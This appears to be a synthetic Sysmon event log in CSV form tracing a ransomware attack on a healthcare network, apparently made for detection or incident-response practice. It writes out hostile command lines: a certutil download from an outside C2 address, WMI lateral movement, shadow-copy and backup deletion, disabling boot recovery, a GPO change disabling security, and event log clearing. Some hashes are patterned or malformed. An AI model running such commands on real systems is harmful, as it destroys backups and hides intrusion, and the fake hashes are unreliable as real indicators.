SystemTime,Computer,EventID,RuleName,Image,CommandLine,TargetImage,ParentImage,ParentCommandLine,User,SourceIp,DestinationIp,DestinationPort,Protocol,Hashes,GrantedAccess
2024-11-20T23:56:28Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:56:42Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:56:56Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:57:10Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:57:24Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:57:38Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:57:52Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:58:06Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:58:20Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:58:34Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:58:48Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:59:02Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:59:16Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:59:30Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:59:44Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:59:58Z,RDP-GW-01,3,LDAP Enumeration,C:\Windows\Temp\SharpHound.exe,SharpHound.exe -c All,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,389,TCP,,
2024-11-20T23:57:30Z,RDP-GW-01,10,LSASS Memory Access,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,,C:\Windows\System32\lsass.exe,,,MEDHEALTHCARE\jdavis,,,,,,0x1FFFFF
2024-11-20T23:57:48Z,RDP-GW-01,11,LSASS Dump Created,,,C:\Windows\Temp\lsass.dmp,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,,MEDHEALTHCARE\jdavis,,,,,,
2024-11-21T00:02:33Z,RDP-GW-01,3,C2 Beacon,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,91.108.4.190,443,TCP,,
2024-11-21T00:10:02Z,RDP-GW-01,1,WMI Lateral Movement,C:\Windows\System32\wbem\wmic.exe,wmic.exe /node:10.0.2.20 /user:svc-app process call create "cmd.exe /c whoami",,C:\Users\jdavis\AppData\Local\Temp\svcupd.exe,svcupd.exe -install,MEDHEALTHCARE\jdavis,,,,TCP,,
2024-11-21T00:10:09Z,RDP-GW-01,3,WMI Network Connection,C:\Windows\System32\wbem\wmic.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.20,135,TCP,,
2024-11-21T00:10:14Z,APPSERVER-01,1,WMI Spawned Shell,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,,C:\Windows\System32\wbem\wmiprvse.exe,wmiprvse.exe,MEDHEALTHCARE\svc-app,,,,TCP,,
2024-11-21T00:10:55Z,APPSERVER-01,1,LOLBin Download,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f https://91.108.4.190/update.exe C:\Windows\Temp\update.exe,,C:\Windows\System32\cmd.exe,cmd.exe /c certutil,MEDHEALTHCARE\svc-app,,,,TCP,,
2024-11-21T00:11:03Z,APPSERVER-01,11,Executable Dropped in Temp,,,C:\Windows\Temp\update.exe,C:\Windows\System32\certutil.exe,,MEDHEALTHCARE\svc-app,,,,,,
2024-11-21T00:11:18Z,APPSERVER-01,1,Suspicious Executable Run,C:\Windows\Temp\update.exe,update.exe -install,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\svc-app,,,,TCP,SHA256=3d2bfa6a72a8e98fbb8e5e1b48cdb14012c74f23d1a789e4b0f65a12897cd3e1,
2024-11-21T00:11:35Z,APPSERVER-01,10,LSASS Memory Access,C:\Windows\Temp\update.exe,,C:\Windows\System32\lsass.exe,,,MEDHEALTHCARE\svc-app,,,,,,0x1FFFFF
2024-11-21T00:12:05Z,APPSERVER-01,3,C2 Callback,C:\Windows\Temp\update.exe,,,,,MEDHEALTHCARE\svc-app,10.0.2.20,91.108.4.190,443,TCP,,
2024-11-21T00:15:30Z,APPSERVER-01,3,C2 Beacon,C:\Windows\Temp\update.exe,,,,,MEDHEALTHCARE\svc-app,10.0.2.20,91.108.4.190,443,TCP,,
2024-11-21T00:24:55Z,APPSERVER-01,1,WMI Lateral Movement,C:\Windows\System32\wbem\wmic.exe,wmic.exe /node:10.0.2.30 process call create "cmd.exe",,C:\Windows\Temp\update.exe,update.exe -install,MEDHEALTHCARE\svc-app,,,,TCP,,
2024-11-21T00:25:02Z,APPSERVER-01,3,WMI Network Connection,C:\Windows\System32\wbem\wmic.exe,,,,,MEDHEALTHCARE\svc-app,10.0.2.20,10.0.2.30,135,TCP,,
2024-11-21T00:25:12Z,BACKUP-SERVER,1,WMI Spawned Shell,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,,C:\Windows\System32\wbem\wmiprvse.exe,wmiprvse.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:26:03Z,BACKUP-SERVER,1,Shadow Copy Deletion,C:\Windows\System32\vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:27:18Z,BACKUP-SERVER,1,Backup Deletion,C:\Windows\System32\wbadmin.exe,wbadmin.exe DELETE SYSTEMSTATEBACKUP,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:28:05Z,BACKUP-SERVER,1,Boot Recovery Disabled,C:\Windows\System32\bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:28:15Z,BACKUP-SERVER,3,C2 Beacon,C:\Windows\Temp\update.exe,,,,,MEDHEALTHCARE\Administrator,10.0.2.30,91.108.4.190,443,TCP,,
2024-11-21T00:35:38Z,APPSERVER-01,1,WMI Lateral Movement,C:\Windows\System32\wbem\wmic.exe,wmic.exe /node:10.0.2.40 process call create "cmd.exe",,C:\Windows\Temp\update.exe,update.exe,MEDHEALTHCARE\svc-app,,,,TCP,,
2024-11-21T00:35:45Z,APPSERVER-01,3,WMI Network Connection,C:\Windows\System32\wbem\wmic.exe,,,,,MEDHEALTHCARE\svc-app,10.0.2.20,10.0.2.40,135,TCP,,
2024-11-21T00:35:55Z,FILESERVER-02,1,WMI Spawned Shell,C:\Windows\System32\cmd.exe,cmd.exe /c dir C:\PatientData,,C:\Windows\System32\wbem\wmiprvse.exe,wmiprvse.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:40:22Z,FILESERVER-02,3,C2 Beacon,C:\Windows\Temp\update.exe,,,,,MEDHEALTHCARE\Administrator,10.0.2.40,91.108.4.190,443,TCP,,
2024-11-21T00:45:29Z,RDP-GW-01,3,RDP to DC,C:\Windows\System32\mstsc.exe,,,,,MEDHEALTHCARE\jdavis,10.0.2.10,10.0.2.5,3389,TCP,,
2024-11-21T00:45:48Z,DC-01,1,Interactive Shell via RDP,C:\Windows\System32\cmd.exe,cmd.exe,,C:\Windows\System32\rdpclip.exe,rdpclip.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:46:15Z,DC-01,1,PowerShell GPO Modification,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -c "Set-GPRegistryValue -Name DefaultDomainPolicy -Key HKLM\Software\Policies -ValueName DisableSecurity -Type DWORD -Value 1",,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T00:50:15Z,FILESERVER-02,1,Data Compression for Exfil,C:\Windows\Temp\rar.exe,"rar.exe a -v500m C:\Windows\Temp\archive C:\PatientData\*.* -hp BlackVault2024!",,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,SHA256=7c4a9f3e8b2d1a5c6e7f9b0a3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3,
2024-11-21T01:00:02Z,FILESERVER-02,1,Ransomware Execution,C:\Windows\Temp\bv_encrypt.exe,bv_encrypt.exe --target C:\PatientData --ext .BLACKVAULT --threads 4,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,SHA256=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2,
2024-11-21T01:15:02Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\patient_records_2024.xlsx.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:15:18Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\lab_results_nov2024.pdf.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:15:35Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\billing_Q4_2024.csv.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:15:49Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\medical_images\scan_0089.dcm.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:16:03Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\insurance_claims_2024.xlsx.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:16:22Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\employee_records.xlsx.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:16:38Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\prescriptions_db.mdb.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:16:55Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\surgery_schedules.xlsx.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:17:11Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\emergency_contacts.xlsx.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:17:28Z,FILESERVER-02,11,Ransomware File Encryption,,,C:\PatientData\research_data_2024.zip.BLACKVAULT,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:30:05Z,FILESERVER-02,11,Ransom Note Dropped,,,C:\PatientData\BLACKVAULT_DECRYPT_INSTRUCTIONS.txt,C:\Windows\Temp\bv_encrypt.exe,,MEDHEALTHCARE\Administrator,,,,,,
2024-11-21T01:32:15Z,FILESERVER-02,1,Shadow Copy Deletion,C:\Windows\System32\vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:33:02Z,FILESERVER-02,1,Boot Recovery Disabled,C:\Windows\System32\bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:40:22Z,FILESERVER-02,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Security,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:41:05Z,BACKUP-SERVER,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Security,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:41:48Z,APPSERVER-01,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Security,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:42:30Z,RDP-GW-01,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Security,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\jdavis,,,,TCP,,
2024-11-21T01:43:15Z,DC-01,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl System,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
2024-11-21T01:43:58Z,DC-01,1,Event Log Cleared,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Application,,C:\Windows\System32\cmd.exe,cmd.exe,MEDHEALTHCARE\Administrator,,,,TCP,,
